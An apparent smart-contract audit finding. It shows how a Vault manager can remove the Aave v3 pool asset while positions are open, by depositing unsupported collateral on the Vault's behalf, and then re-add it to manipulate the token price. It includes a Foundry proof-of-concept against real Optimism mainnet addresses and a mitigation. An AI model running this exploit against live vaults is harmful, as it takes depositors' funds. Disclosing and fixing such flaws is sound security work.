# [M] Manager can remove the Aave Lending Pool

## Summary
Severity: Medium
Contest weight: 0.7606
Dataset id: 22920
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The manager can remove the Aave Lending Pool from the supported assets when the collateral is exactly the same as the debt. After some time has passed and the position has changed, the manager can add it again to the Vault to disrupt the Vault's token price and arbitrage it. When the manager of a Vault wants to remove an asset from the supported assets list, there's a check that ensures that the Vault isn't holding any of those assets. For example, for assets that are simple ERC20 tokens, the following check is executed before the asset is removed:
s/guards/assetGuards/ERC20Guard.sol#L141-L144
```solidity
function getBalance(address pool, address asset) public view virtual override returns (uint256 balance) {
    // The base ERC20 guard has no externally staked tokens
    balance = IERC20(asset).balanceOf(pool);
}
function removeAssetCheck(address pool, address asset) public view virtual override {
    uint256 balance = getBalance(pool, asset);
    require(balance == 0, "cannot remove non-empty asset");
}
```
For more complex assets, the check before removing an asset is different. If the manager of a Vault wants to interact with the Aave protocol, the contract PoolV3 from Aave must be added as a supported asset. In the same way, if the manager wants to remove the PoolV3 asset from the supported assets list, the balance has to be zero, which is checked here:
s/guards/assetGuards/AaveLendingPoolAssetGuard.sol#L106
```solidity
function getBalance(address pool, address) public view override returns (uint256 balance) {
    uint256 length = supportedAssets.length;
    for (uint256 i = 0; i < length; i++) {
        asset = supportedAssets[i].asset;
        // Lending/Borrowing enabled asset
        if (IHasAssetInfo(factory).getAssetType(asset) == 4 || IHasAssetInfo(factory).getAssetType(asset) == 14) {
            (collateralBalance, debtBalance, decimals) = _calculateAaveBalance(pool, asset);
            if (collateralBalance != 0 || debtBalance != 0) {
                tokenPriceInUsd = IHasAssetInfo(factory).getAssetPrice(asset);
                totalCollateralInUsd = totalCollateralInUsd.add(tokenPriceInUsd.mul(collateralBalance).div(10 ** decimals));
                totalDebtInUsd = totalDebtInUsd.add(tokenPriceInUsd.mul(debtBalance).div(10 ** decimals));
            }
        }
    }
    balance = totalCollateralInUsd.sub(totalDebtInUsd);
}
```
The last line of the getBalance function is what determines the Vault's balance within the AaveV3 protocol. The manager should only be able to remove that asset from being supported only when the balance is zero, meaning the total collateral and debt is zero. However, a manager could trick the contract by depositing directly into Aave a non-supported token on behalf of the Vault. As the getBalance shows, the balance is only accounted for the supported assets, which means that if someone deposits collateral in Aave using a non-supported asset on behalf of the Vault, that balance won't be accounted for in totalCollateralInUsd. Using this trick, the manager could remove the PoolV3 asset from being supported by following these steps:
1. The manager uses the Vault to deposit collateral in Aave (e.g. 1 WETH).
2. The manager directly deposits on Aave on behalf of the Vault using a non-supported token (e.g. 0.3 rETH).
3. The manager uses the Vault to make a borrow that is equal in value to the first deposit (e.g. 3,455 USD).
4. The manager removes the PoolV3 asset from being supported because the balance will be 0 (collateral - debt).
In step 4, the manager will be able to remove the asset from being supported because only one part of the Aave collateral is being accounted for, the 1 WETH. Because rETH isn't supported in the Vault at that moment, the 0.3 rETH collateral won't be accounted for, resulting in the balance being 0. This issue won't have any impact in the Vault in the short term, but the manager can use this bug later to steal funds from the Vault's users. After this issue has been triggered, we have 2 possible scenarios:
Scenario 1: Aave position has profits
First, we have the scenario where the ETH price increases so the Aave position incurs profits given that the collateral is based on ETH. When this happens, the manager could steal some of the user's funds by following these steps:
1. Make a huge deposit in the Vault.
2. Add PoolV3 as a supported asset.
3. Withdraw the funds previously deposited (after the cooldown).
After these steps, the manager will make a profit because adding the PoolV3 asset as supported in the Vault has increased the Vault's token price.
Scenario 2: Aave position has losses
On the other hand, is possible that the ETH price goes down so the Aave position has losses. In this case, the manager could grief the users in the Vault by adding again the PoolV3 asset so that those losses are reflected in the Vault's token price, causing a loss of funds for all users.
The manager of a Vault can disrupt the Vault's token price by removing the PoolV3 (Aave v3) asset as supported and later adding it. If the prices have changed and the position has incurred profits, the manager can steal some of those profits that should go only to the Vault's users.

## Proof of Concept
The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_remove_supported. Additionally, you must have the following line in the .env file in order for the test to fork the blockchain:
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;
import {Test} from "forge-std/Test.sol";
interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
}
interface IAavePool {
    function deposit(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IAaveLendingPoolAssetGuard {
    function getBalance(address pool, address) external view returns (uint256);
}
interface IPoolManagerLogic {
    struct Asset {
        address asset;
        bool isDeposit;
    }
    function changeAssets(Asset[] calldata _addAssets, address[] calldata _removeAssets) external;
}
contract PoolTest is Test {
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    IPoolManagerLogic manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    IAavePool aaveLendingPool = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveLendingPoolAssetGuard aaveGuard = IAaveLendingPoolAssetGuard(0xF7E8a2ED2Dfa2b9AAF76c75f575474c299848577);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    IERC20 RETH = IERC20(0x9Bcef72be871e61ED4fBbc7630889beE758eb81D);
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");
    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121348913); // Jun-13-2024 04:36:43 PM +UTC
    }
    function test_remove_supported() public {
        // First, simulate the pool getting 1 WETH
        deal(address(WETH), address(pool), 1e18);
        // Approve 1 WETH to the Aave lending pool
        bytes memory data = abi.encodeWithSelector(WETH.approve.selector, address(aaveLendingPool), 1e18);
        vm.prank(managerAddress);
        pool.execTransaction(address(WETH), data);
        // Supply 1 WETH to the Aave lending pool
        data = abi.encodeWithSelector(aaveLendingPool.deposit.selector, address(WETH), 1e18, address(pool), 0);
        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);
        // The manager deposits 0.3 rETH on behalf of the pool
        deal(address(RETH), managerAddress, 0.3e18);
        vm.startPrank(managerAddress);
        RETH.approve(address(aaveLendingPool), 0.3e18);
        aaveLendingPool.deposit(address(RETH), 0.3e18, address(pool), 0);
        vm.stopPrank();
        // Borrow some USDC
        data = abi.encodeWithSelector(aaveLendingPool.borrow.selector, address(USDC), 3455.5e6, 2, 0, address(pool));
        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);
        // Check the Vault's Aave balance is 0 (even though it has some collateral and borrows)
        assertEq(aaveGuard.getBalance(address(pool), address(0)), 0);
        // The manager removes the aaveLendingPool asset from being supported
        address[] memory removeAssets = new address[](1);
        removeAssets[0] = address(aaveLendingPool);
        vm.prank(managerAddress);
        manager.changeAssets(new IPoolManagerLogic.Asset[](0), removeAssets);
    }
}
```
As this test demonstrates, the manager can remove the Aave v3 lending pool from the supported assets even if the Vault has some collateral and borrows. After the test, when some time passes and the ETH price changes, the manager can add back the Aave v3 lending pool as a supported asset to disrupt the Vault's token price and even make some profits.

## Recommendation
To mitigate this issue is recommended to check that the Vault doesn't have any collateral or borrow in Aave before allowing the removal of the Aave lending pool from the list of supported assets.
